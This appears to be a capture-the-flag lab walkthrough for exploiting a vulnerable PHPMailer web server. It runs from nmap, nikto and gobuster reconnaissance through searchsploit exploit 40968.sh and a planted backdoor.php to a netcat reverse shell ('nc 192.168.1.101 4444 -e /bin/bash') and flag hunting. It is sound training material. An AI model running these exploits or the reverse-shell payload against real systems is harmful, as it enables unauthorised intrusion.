# **TARGET 1 Offensive WalkThrough**

## Overview

You are working as a Security Engineer for X-CORP, supporting the SOC infrastructure. The SOC analysts have noticed some discrepancies with alerting in the Kibana system and the manager has asked the Security Engineering team to investigate.

To start, your team needs to confirm that newly created alerts are working. Once the alerts are verified to be working, you will monitor live traffic on the wire to detect any abnormalities that aren't reflected in the alerting system.

You will then report back all your findings to both the SOC manager and the Engineering Manager with appropriate analysis.

>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other methods have been explored. Read Team: Summary of Operation and the PowerPoint presentation to find more methods not specified in this walkthrough.

---

Tools:

- Kali Linux
- Q shell
- Namp
- Nikto
- Gobuster
- FireFox Browser
- Searchsploit
- Bash Script
- NetCat

---

## **Walkthrough**

1. Run a commmand to see host IP and network adddresses

        ifconfig

    ![1](/Images/4/1.PNG)

2. Network FootPrinting (find machines on the network)

        nmap 192.168.1.0/24

    ![2](/Images/4/2.PNG)

3. Target 2 fingerprinting (find services and ports on target) 

        nmap -sV 192.168.1.115 

    ![3](/Images/4/3.PNG)

4.  Look for Webserver vulnerabilities using Nikto

        nikto -C all -h 192.168.1.115

    ![4](/Images/4/4.PNG)

5. Scan for paths in the webserver using Gobuster.

        gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115

    ![5](/Images/4/5.PNG)

6. Explore path `192.168.1.115/vendor/` using the browser 
   
        192.168.1.115/vendor/

    **PHPMAILER detected**

    ![6](/Images/4/6.PNG)     
   
7. Double click "PATH"

    **Flag1**

    ![7](/Images/4/7.PNG)

8. Double "Click SECURITY.md"

    **It reveals vulnerable versions of PHPMAILER.**

    ![8](/Images/4/8.PNG)    

9.  Double "Click VERSION" 

    **It reveals the PHPMAILER version in use**

    ![9](/Images/4/9.PNG)  

10. Look for scripts to exploit PHPMAILER with Searchsploit

        searchsploit phpmailer

    ![10](/Images/4/10.PNG)  

11. Look at the Bash Script to exploit  PHPMAILER

        searchsploit phpmailer -x php/webapps/40968.sh     

    **press "q" keyboard to quit view**

    ![11](/Images/4/11.PNG) 

12. Download the script to the current folder

        searchsploit phpmailer -m php/webapps/40968.sh

    ![12](/Images/4/12.PNG)

13. Authorize file to execute

        sudo chmod 777 40968.sh

14. run exploit

        ./40968.sh 192.168.1.115

    ![13](/Images/4/13.PNG)

    > Note: Now we know the PHPMAILER can be exploited, but the shell from this script does not allow to do much. We can find and use a more useful script that allows to create a more powerfull shell.

    Script: [exploit.sh](/Resources/explot.sh)

15. Change script URL

        nano exploit.sh

    **Use "CTRL X", then "y", and "enter" (to exit nano)**

    ![14](/Images/4/14.PNG)

16. Authorize file to execute

         sudo chmod 777 exploit.sh

17. Execute file

        ./exploit.sh

    ![15](/Images/4/15.PNG)

18. Set netcat to lisent on kali machine

         nc -lnvp 4444

    ![16](/Images/4/16.PNG)

19. Make exploited machine calls Kali Linux machine with a netcat command embedded in the next payload after running it in the browser.

        192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash

    **Change the second IP address for the one of your own kali linux machine.**

    ![17](/Images/4/17.PNG)

21. Look for flags with find command

        find /var/www -type f -iname 'flag*'

    ![18](/Images/4/18.PNG)

22. Open file

        cat /var/www/flag2.txt

    **flag2**

    ![19](/Images/4/19.PNG)

23. Look for others flags

        find -type f -iname '*flag*'

    **The "./" previous "wordpress" means the file is active on wordpress.**

    ![20](/Images/4/20.PNG)

24. Inset paths on the browser

        http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png

    **flag3**
   ![21](/Images/4/21.PNG)